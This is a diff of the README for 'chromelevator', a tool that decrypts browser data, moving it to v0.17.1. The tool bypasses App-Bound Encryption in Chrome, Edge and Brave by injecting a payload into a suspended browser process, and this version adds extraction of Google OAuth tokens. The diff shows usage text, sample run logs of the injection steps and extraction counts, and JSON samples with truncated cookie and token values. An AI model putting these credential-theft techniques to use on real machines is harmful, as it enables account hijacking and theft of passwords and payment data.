@@ -31,7 +31,7 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 
 ### Core Functionality
 
-- 🔓 Full user-mode decryption of cookies, passwords, payment methods, and IBANs.
+- 🔓 Full user-mode decryption of cookies, passwords, payment methods, IBANs, and Google OAuth tokens.
 - 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
 - 📝 Exports all extracted data into structured JSON files, organized by profile.
 - 🔍 Comprehensive browser fingerprinting with system information.
@@ -76,7 +76,8 @@ This matrix outlines the extraction capabilities for each supported browser.
 | **Cookies**         | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
 | **Passwords**       | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
 | **Payment Methods** | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
-| **IBANs**           | ✅ ABE                | ✅ ABE                | ❌ Not existing                        |
+| **IBANs**           | ✅ ABE                | ✅ ABE                | ❌ N/A                                 |
+| **Auth Tokens**     | ✅ Google             | ❌ N/A                | ❌ N/A                                 |
 
 **Encryption Method Notes:**
 - **ABE (App-Bound Encryption):** Using AES-256-GCM with browser-specific master keys decrypted via COM interfaces.
@@ -153,7 +154,7 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.0 by @xaitax
+ x64 & ARM64 | v0.17.1 by @xaitax
 
   Usage: chromelevator.exe [options] <chrome|edge|brave|all>
 
@@ -184,6 +185,7 @@ _________ .__                         ___________.__                       __
 
 ```bash
 PS> .\chromelevator.exe all
+
 _________ .__                         ___________.__                       __
 \_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
 /    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
@@ -191,7 +193,7 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.0 by @xaitax
+ x64 & ARM64 | v0.17.1 by @xaitax
 
   ┌──── Brave ──────────────────────────────────────
   │
@@ -199,12 +201,12 @@ _________ .__                         ___________.__                       __
   │ 2522A3C1730EA8EE84BAAD1994DB31E20437D9DCF27628997598BB5B86F73DCD
   │
   ├── Default
-  │   Cookies     2446/2467
+  │   Cookies     2439/2460
   │   Passwords   46
   │   Cards       1
   │   IBANs       1
   │
-  └── 2446 cookies, 46 passwords, 1 cards, 1 IBANs (1 profile)
+  └── 2439 cookies, 46 passwords, 1 cards, 1 IBANs (1 profile)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave
 
   ┌──── Chrome ──────────────────────────────────────
@@ -217,12 +219,13 @@ _________ .__                         ___________.__                       __
   │   Passwords   1
   │
   ├── Profile 1
-  │   Cookies     768/773
-  │   Passwords   2
+  │   Cookies     815/820
+  │   Passwords   789
   │   Cards       1
   │   IBANs       1
+  │   Tokens      1
   │
-  └── 1146 cookies, 3 passwords, 1 cards, 1 IBANs (2 profiles)
+  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 
   ┌──── Edge ──────────────────────────────────────
@@ -231,14 +234,14 @@ _________ .__                         ___________.__                       __
   │ B0334FAD7F5805362CB4C44B144A95AB7A68F7346EF99EB3F175F09DB08C8FD9
   │
   ├── Default
-  │   Cookies     220/222
+  │   Cookies     214/216
   │   Passwords   2
   │   Cards       1
   │
   ├── Profile 1
-  │   Cookies     42
+  │   Cookies     25
   │
-  └── 262 cookies, 2 passwords, 1 cards (2 profiles)
+  └── 239 cookies, 2 passwords, 1 cards (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge
 ```
 
@@ -254,23 +257,23 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.0 by @xaitax
+ x64 & ARM64 | v0.17.1 by @xaitax
 
   ┌──── Chrome ──────────────────────────────────────
   │ Terminating browser network services...
   │   [+] Network services terminated
   │ Creating suspended process: C:\Program Files\Google\Chrome\Application\chrome.exe
-  │   [+] Process created (PID: 25184)
-  │   [+] IPC pipe established: \\.\pipe\chrome.nacl.20027_76C4
+  │   [+] Process created (PID: 13020)
+  │   [+] IPC pipe established: \\.\pipe\chrome.sync.26370.18285.8B20
   │ Deriving runtime decryption keys...
-  │   [+] Payload decrypted (1044 KB)
-  │   [+] Bootstrap entry point resolved (offset: 0x2a690)
+  │   [+] Payload decrypted (1048 KB)
+  │   [+] Bootstrap entry point resolved (offset: 0x2a790)
   │ Allocating memory in target process via syscall...
-  │   [+] Memory allocated at 0x1c2dec60000 (1048 KB)
+  │   [+] Memory allocated at 0x2245a600000 (1052 KB)
   │   [+] Payload + parameters written
   │   [+] Memory protection set to PAGE_EXECUTE_READ
   │ Creating remote thread via syscall...
-  │   [+] Thread created (entry: 0x1c2dec8a690)
+  │   [+] Thread created (entry: 0x2245a62a790)
   │ Awaiting payload connection...
   │   [+] Payload connected
   │ Running in Chrome
@@ -284,15 +287,16 @@ _________ .__                         ___________.__                       __
   │   Passwords   1
   │
   ├── Profile 1
-  │   Size        610 MB
-  │   Cookies     768/773
-  │   Passwords   2
+  │   Size        739 MB
+  │   Cookies     815/820
+  │   Passwords   789
   │   Cards       1
   │   IBANs       1
+  │   Tokens      1
   │ Extracting comprehensive fingerprint...
   │ Fingerprint saved to fingerprint.json
   │
-  └── 1146 cookies, 3 passwords, 1 cards, 1 IBANs (2 profiles)
+  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 ```
 
@@ -319,11 +323,15 @@ Each cookie file is a JSON array of objects:
   {
     "host": "accounts.google.com",
     "name": "ACCOUNT_CHOOSER",
+    "path": "/",
+    "expires": 1766591611,
     "value": "AFx_qI781-…"
   },
   {
     "host": "mail.google.com",
     "name": "OSID",
+    "path": "/mail",
+    "expires": 1766591611,
     "value": "g.a000uwj5ufIS…"
   },
   …
@@ -375,7 +383,21 @@ Each IBAN file is a JSON array of objects:
 ]
 ```
 
-### 🔍 Browser Fingerprinting 
+### 🎟️ Token Extraction
+
+Each token file is a JSON array of objects containing the service, the decrypted token, and the binding key (if present):
+
+```json
+[
+  {
+    "service": "AccountId-112823413702122221871",
+    "token": "1//03VJGN_vL2FR5CgYIARAAGAMSNwF-L9IrtiyH_tmtOneETFya5GEGiewlEMrLwDMuOl56zRoShNE77DfyOXhofn5Ryo_...",
+    "binding_key": ""
+  }
+]
+```
+
+### 🔍 Browser Fingerprinting
 
 When using the `--fingerprint` or `-f` flag, a comprehensive metadata report is generated:
 
